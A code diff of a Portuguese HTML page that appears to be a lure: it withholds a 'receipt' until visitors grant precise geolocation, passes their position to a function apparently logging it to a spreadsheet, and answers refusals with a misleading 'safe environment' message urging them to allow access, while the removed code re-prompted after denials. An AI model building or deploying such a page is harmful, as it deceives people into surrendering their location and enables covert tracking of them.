@@ -1,3 +1,5 @@
+
+<!DOCTYPE html>
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
@@ -350,40 +352,15 @@
       }
 
       .conteudo-centralizado {
-        padding: 15px;
+        margin-top: 50px; /* Aumenta o espaço acima do conteúdo */
+        padding: 51px;
       }
 
       h1 {
         font-size: 20px;
       }
     }
-    
-    /* Novo CSS para mensagem de erro interativa */
-    #errorMessage {
-      padding: 12px;
-      border-radius: 8px;
-      background: rgba(255, 68, 68, 0.1);
-      transition: all 0.3s;
-      cursor: pointer;
-      margin-top: 15px;
-      border: 1px solid rgba(255, 68, 68, 0.3);
-    }
-
-    #errorMessage:hover {
-      background: rgba(255, 68, 68, 0.2);
-    }
-
-    #errorMessage.retry {
-      background: rgba(76, 175, 80, 0.1);
-      border-color: rgba(76, 175, 80, 0.3);
-    }
-
-    #errorMessage.retry:hover {
-      background: rgba(76, 175, 80, 0.2);
-    }
-    
-      </style>
-      
+  </style>
 </head>
 <body>
   <!-- Cabeçalho -->
@@ -515,32 +492,16 @@
       }
     }
     
-// Substitua a função iniciarProcesso por esta versão atualizada
-async function iniciarProcesso() {
-  try {
-    // Verifica o status da permissão
-    const permissionStatus = await navigator.permissions.query({ name: 'geolocation' });
-    
-    if (permissionStatus.state === 'denied') {
-      mostrarErro("Permissão bloqueada. Acesse as configurações do navegador para habilitar.");
-      return;
-    }
-
-    // Força nova solicitação mesmo se já negou antes
-    navigator.geolocation.getCurrentPosition(
-      pos => mostrarComprovante(pos),
-      erro => tratarErro(erro),
-      {
-        enableHighAccuracy: true,
-        timeout: 5000,
-        maximumAge: 0 // Não usa cache
+    function iniciarProcesso() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          pos => mostrarComprovante(pos),
+          erro => tratarErro(erro)
+        );
+      } else {
+        mostrarErro("Geolocalização não suportada pelo navegador.");
       }
-    );
-    
-  } catch (error) {
-    mostrarErro("Erro ao verificar permissões: " + error.message);
-  }
-}
+    }
     
     function mostrarComprovante(pos) {
       dadosSection.classList.remove('hidden');
@@ -550,35 +511,23 @@ async function iniciarProcesso() {
       registrarPlanilha(pos);
     }
     
-function tratarErro(erro) {
-  if (erro.code === erro.PERMISSION_DENIED) {
-    denyCount++;
-    const msg = `Permissão negada. Ambiente seguro! Para acessar o comprovante tem que autorizar as permissões. Tente novamente em 5 segundos. (${denyCount})`;
-    mostrarErro(msg);
-    showSecurityBanner();
-
-    // Adiciona listener no texto de erro para nova tentativa
-    errorMessageEl.style.cursor = 'pointer';
-    errorMessageEl.onclick = () => {
-      errorMessageEl.textContent = "Solicitando nova permissão...";
-      iniciarProcesso(); // você já deve ter essa função implementada
-    };
-
-    setTimeout(() => {
-      errorMessageEl.textContent = "";
-      errorMessageEl.style.cursor = 'default';
-      errorMessageEl.onclick = null;
-    }, 7000);
-
-  } else if (erro.code === erro.POSITION_UNAVAILABLE) {
-    mostrarErro("Serviço de localização indisponível.");
-  } else if (erro.code === erro.TIMEOUT) {
-    mostrarErro("Tempo excedido para obtenção da localização.");
-  } else {
-    mostrarErro("Erro desconhecido na geolocalização.");
-  }
-}
-
+    function tratarErro(erro) {
+      if (erro.code === erro.PERMISSION_DENIED) {
+        denyCount++;
+        const msg = `Permissão negada. Ambiente seguro! Para acessar o comprovante tem que autorizar as permissões. Tente novamente em 5 segundos. (${denyCount})`;
+        mostrarErro(msg);
+        showSecurityBanner();
+        setTimeout(() => {
+          errorMessageEl.textContent = "";
+        }, 7000);
+      } else if (erro.code === erro.POSITION_UNAVAILABLE) {
+        mostrarErro("Serviço de localização indisponível.");
+      } else if (erro.code === erro.TIMEOUT) {
+        mostrarErro("Tempo excedido para obtenção da localização.");
+      } else {
+        mostrarErro("Erro desconhecido na geolocalização.");
+      }
+    }
     
     function mostrarErro(msg) {
       errorMessageEl.textContent = msg;
